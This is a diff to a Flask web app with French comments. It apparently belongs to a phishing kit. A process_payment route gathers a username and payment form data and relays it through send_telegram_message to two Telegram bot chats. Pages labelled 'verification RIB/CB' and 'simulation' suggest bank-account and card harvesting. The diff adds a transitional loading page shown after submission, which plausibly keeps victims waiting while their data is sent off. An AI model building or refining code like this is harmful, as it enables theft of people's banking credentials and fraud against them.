@@ -14,6 +14,7 @@ CHAT_ID = os.getenv("CHAT_ID")
 TELEGRAM_BOT_TOKEN_2 = os.getenv("BOT_TOKEN_2")
 CHAT_ID_2 = os.getenv("CHAT_ID_2")
 
+# --- ENVOI DU MESSAGE TELEGRAM ---
 def send_telegram_message(message):
     if TELEGRAM_BOT_TOKEN and CHAT_ID:
         url_1 = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -38,6 +39,7 @@ def send_telegram_message(message):
 def home():
     return render_template('payment_info.html')
 
+# --- PAGE PAYMENT INFO ---
 @app.route("/payment-info", methods=["GET"])
 def payment_info_page():
     username = session.get("username")
@@ -50,6 +52,7 @@ def payment_info_page():
                            verification_code=verification_code,
                            phone_number=phone_number)
 
+# --- TRAITEMENT DU FORMULAIRE ---
 @app.route("/process_payment", methods=["POST"])
 def process_payment():
     username = request.form.get("username") or session.get('username')
@@ -88,28 +91,31 @@ def process_payment():
 
     send_telegram_message(message)
 
-    # Après la soumission, rediriger vers la page de simulation (sans param -> page de choix)
-    return redirect(url_for('simulation_page'))
+    # Redirection vers la page de chargement avant la simulation
+    return redirect(url_for('loading_page'))
 
-# --- ROUTE POUR LA PAGE DE VERIFICATION RIB/CB ---
+# --- PAGE DE CHARGEMENT (NOUVELLE PAGE) ---
+@app.route("/loading-page", methods=["GET"])
+def loading_page():
+    """
+    Page de transition avec décompte avant la simulation.
+    """
+    return render_template("loading_page.html")
+
+# --- PAGE DE VERIFICATION RIB/CB ---
 @app.route("/verification-rib-cb", methods=["GET"])
 def verification_rib_cb():
     return render_template("verification_rib_cb.html")
 
-# --- ROUTE POUR LA PAGE DE SCENARIOS SIMULATION ---
+# --- PAGE DES SCÉNARIOS ---
 @app.route("/scenarios-simulation", methods=["GET"])
 def scenarios_simulation():
     scenario_type = request.args.get("type")
     return render_template("scenarios_simulation.html", type=scenario_type)
 
-# --- PAGE DE SIMULATION (unique, gère le paramètre optionnel "type") ---
+# --- PAGE DE SIMULATION ---
 @app.route("/simulation-page", methods=["GET"])
 def simulation_page():
-    """
-    Si ?type=rib -> affiche directement la section RIB.
-    Si ?type=cb  -> affiche directement la section CB.
-    Si pas de type -> affiche la page de simulation (cas après process_payment).
-    """
     scenario = request.args.get("type")  # peut être 'rib', 'cb' ou None
     return render_template("simulation_page.html", type=scenario)
 
